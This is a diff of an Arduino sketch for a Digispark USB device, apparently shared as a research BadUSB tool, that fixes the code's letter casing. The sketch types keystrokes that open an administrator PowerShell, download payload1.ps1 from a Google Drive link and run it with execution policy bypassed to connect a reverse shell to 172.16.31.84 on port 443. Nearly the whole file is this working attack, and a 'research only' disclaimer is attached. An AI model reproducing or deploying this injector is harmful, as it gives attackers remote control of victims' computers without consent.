@@ -1,59 +1,59 @@
-#INCLUDE “DIGIKEYBOARD.H”
-#DEFINE KEY_LEFT_ARROW 0XD8
-// POWERSHELL REVERSE SHELL HTTPS://DRIVE.GOOGLE.COM/UC?EXPORT=DOWNLOAD&ID=YOURDOWNLOADHERE
-// WRITTEN BY JORDON LOVIK FOR RESEARCH PURPOSES ONLY. DO NOT USE OR DISTRIBUTE THIS CODE FOR ANYTHING BUT EDUCATION. I AM NO LIABLE FOR ANY HARM THIS SCRIPT MAY DO TO YOU OR ANYONE ELSES COMPUTER.
-VOID SETUP() {
-// RUNSPEED USE NUMBERS BETWEEN 50 – 2000
-INT RUNSPEED = 500;
-//DEFINE LED
-PINMODE(0, OUTPUT); //LED ON MODEL B
-PINMODE(1, OUTPUT); //LED ON MODEL A
-DIGIKEYBOARD.DELAY(3*RUNSPEED);
-//TURN LIGHT ON
-DIGITALWRITE(0, HIGH);
-DIGITALWRITE(1, HIGH);
-DIGIKEYBOARD.SENDKEYSTROKE(0,0);
-DIGIKEYBOARD.SENDKEYSTROKE(KEY_R, MOD_GUI_LEFT);
-DIGIKEYBOARD.DELAY(1*RUNSPEED);
-//START POWERSHELL AS ADMINISTRATOR – ENABLES YOU TO BYPASS EXECTIONS POLICY LATER
-DIGIKEYBOARD.PRINTLN(“POWERSHELL START-PROCESS POWERSHELL.EXE -VERB RUNAS”);
-DIGIKEYBOARD.DELAY(1*RUNSPEED);
-DIGIKEYBOARD.SENDKEYSTROKE(0,0);
-DIGIKEYBOARD.SENDKEYSTROKE(KEY_LEFT_ARROW);
-DIGIKEYBOARD.DELAY(3*RUNSPEED);
-DIGIKEYBOARD.SENDKEYSTROKE(KEY_ENTER);
-//DEFINE PAYLOAD DOWNLOAD LOCATION (MAKE SURE THIS IS A DIRECT DOWNLOAD LINK)
-DIGIKEYBOARD.DELAY(3*RUNSPEED);
-DIGIKEYBOARD.PRINTLN(“$URL = \”HTTPS://DRIVE.GOOGLE.COM/UC?EXPORT=DOWNLOAD&ID=13DLTW-FTKKFPRYAC2DZQNM7JURZZQHQS\””);
-DIGIKEYBOARD.UPDATE();
-DIGIKEYBOARD.DELAY(1*RUNSPEED);
-//GRABS USER NAME BASED ON LOGGED ON USER AND STORES IT IN $USER
-DIGIKEYBOARD.PRINTLN(“$USER = [ENVIRONMENT]::USERNAME”);
-DIGIKEYBOARD.UPDATE();
-DIGIKEYBOARD.DELAY(1*RUNSPEED);
-//WRITE TO CONDITIONAL OUTPUT PATH USING THE DESKTOP FOR DEBUGGING
-DIGIKEYBOARD.PRINTLN(“$OUTPUT = \”C:\\USERS\\$USER\\DESKTOP\\PAYLOAD1.PS1\””);
-DIGIKEYBOARD.UPDATE();
-DIGIKEYBOARD.DELAY(1*RUNSPEED);
-//DOWNLOAD THE PAYLOAD FROM THE SPECIFIED URL
-DIGIKEYBOARD.PRINTLN(“INVOKE-WEBREQUEST -URI $URL -OUTFILE $OUTPUT”);
-DIGIKEYBOARD.UPDATE();
-DIGIKEYBOARD.DELAY(3*RUNSPEED);
-//-WINDOWSTYLE HIDDEN
-DIGIKEYBOARD.PRINTLN(“POWERSHELL.EXE -EXECUTIONPOLICY BYPASS \”C:\\USERS\\$USER\\DESKTOP\\PAYLOAD1.PS1 -DEST 172.16.31.84 -PORT 443\””); //IP
+#include "DigiKeyboard.h"
+#define KEY_LEFT_ARROW 0xd8
+// powershell reverse shell https://drive.google.com/uc?export=download&id=yourdownloadhere
+// written by jordon lovik for research purposes only. do not use or distribute this code for anything but education. i am no liable for any harm this script may do to you or anyone elses computer.
+void setup() {
+// runspeed use numbers between 50 – 2000
+int runspeed = 500;
+//define led
+pinMode(0, OUTPUT); //led on model b
+pinMode(1, OUTPUT); //led on model a
+DigiKeyboard.delay(3*runspeed);
+//turn light on
+digitalWrite(0, HIGH);
+digitalWrite(1, HIGH);
+DigiKeyboard.sendKeyStroke(0,0);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(1*runspeed);
+//start powershell as administrator – enables you to bypass exections policy later
+DigiKeyboard.println("powershell start-process powershell.exe -verb runas");
+DigiKeyboard.delay(1*runspeed);
+DigiKeyboard.sendKeyStroke(0,0);
+DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
+DigiKeyboard.delay(3*runspeed);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+//define payload download location (make sure this is a direct download link)
+DigiKeyboard.delay(3*runspeed);
+DigiKeyboard.println("$url = \"https://drive.google.com/uc?export=download&id=13dltw-ftkkfpryac2dzqnm7jurzzqhqs\"");
+DigiKeyboard.update();
+DigiKeyboard.delay(1*runspeed);
+//grabs user name based on logged on user and stores it in $user
+DigiKeyboard.println("$user = [environment]::username");
+DigiKeyboard.update();
+DigiKeyboard.delay(1*runspeed);
+//write to conditional OUTPUT path using the desktop for debugging
+DigiKeyboard.println("$OUTPUT = \"c:\\users\\$user\\desktop\\payload1.ps1\"");
+DigiKeyboard.update();
+DigiKeyboard.delay(1*runspeed);
+//download the payload from the specified url
+DigiKeyboard.println("invoke-webrequest -uri $url -outfile $OUTPUT");
+DigiKeyboard.update();
+DigiKeyboard.delay(3*runspeed);
+//-windowstyle hidden
+DigiKeyboard.println("powershell.exe -executionpolicy bypass \"c:\\users\\$user\\desktop\\payload1.ps1 -dest 172.16.31.84 -port 443\""); //ip
 }
-VOID LOOP() {
-//BLINK LIGHTS WHEN SCRIPT COMPLETES
-DIGITALWRITE(0, HIGH);
-DIGITALWRITE(1, HIGH);
-DELAY(50);
-DIGITALWRITE(0, LOW);
-DIGITALWRITE(1, LOW);
-DELAY(50);
-DIGITALWRITE(0, HIGH);
-DIGITALWRITE(1, HIGH);
-DELAY(20);
-DIGITALWRITE(0, HIGH);
-DIGITALWRITE(1, HIGH);
-DELAY(20);
+void loop() {
+//blink lights when script completes
+digitalWrite(0, HIGH);
+digitalWrite(1, HIGH);
+delay(50);
+digitalWrite(0, LOW);
+digitalWrite(1, LOW);
+delay(50);
+digitalWrite(0, HIGH);
+digitalWrite(1, HIGH);
+delay(20);
+digitalWrite(0, HIGH);
+digitalWrite(1, HIGH);
+delay(20);
 }
